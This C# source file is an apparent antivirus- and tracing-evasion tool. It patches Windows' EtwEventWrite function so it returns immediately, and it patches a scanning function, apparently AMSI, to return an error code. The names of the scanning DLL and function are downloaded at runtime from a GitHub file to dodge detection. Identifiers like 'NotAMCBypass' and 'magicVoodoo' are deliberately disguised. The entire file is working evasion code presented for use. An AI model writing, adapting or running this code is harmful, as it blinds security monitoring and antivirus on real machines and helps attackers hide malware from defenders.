using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace mscorelib
{

    class Program
    {
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
        string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

        static bool Is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        static byte[] NotAMCBypass(string function)
        {
            byte[] patch;
            if (function.ToLower() == "antitrace")
            {
                if (Is64Bit)
                {
                    patch = new byte[2];
                    patch[0] = 0xc3;
                    patch[1] = 0x00;
                }
                else
                {
                    patch = new byte[3];
                    patch[0] = 0xc2;
                    patch[1] = 0x14;
                    patch[2] = 0x00;
                }
                return patch;
            }
            else if (function.ToLower() == "avnomo")
            {
                if (Is64Bit)
                {
                    patch = new byte[6];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC3;
                }
                else
                {
                    patch = new byte[8];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC2;
                    patch[6] = 0x18;
                    patch[7] = 0x00;

                }
                return patch;
            }
            else throw new ArgumentException("function is not supported");
        }

        static void AntiTrace()
        {
            string traceloc = "ntdll.dll";
            string magicFunction = "EtwEventWrite";
            IntPtr ntdllAddr = LoadLibrary(traceloc);
            IntPtr traceAddr = GetProcAddress(ntdllAddr, magicFunction);
            byte[] magicVoodoo = NotAMCBypass("AntiTrace");
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("no more tracing!");
        }
        static void AVNoMo()
        {
            using (var client = new WebClient())
            {
                client.DownloadFile("https://raw.githubusercontent.com/EASI-Sec/Evasion-in-Cs/main/notAMC.txt", "notAMC.txt");
            }
            System.IO.StreamReader readingFile = new System.IO.StreamReader("notAMC.txt");
            string amdll = readingFile.ReadLine();
            string amscbuf = readingFile.ReadLine();

            string avloc = amdll;
            string magicFunction = amscbuf;

            IntPtr avAddr = LoadLibrary(avloc);
            IntPtr traceAddr = GetProcAddress(avAddr, magicFunction);
            byte[] magicVoodoo = NotAMCBypass("AvNoMo");
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, traceAddr, magicVoodoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("no more av");
        }
        static void Main(string[] args)
        {
            AntiTrace();
            AVNoMo();
            Console.ReadKey();
        }
    }
}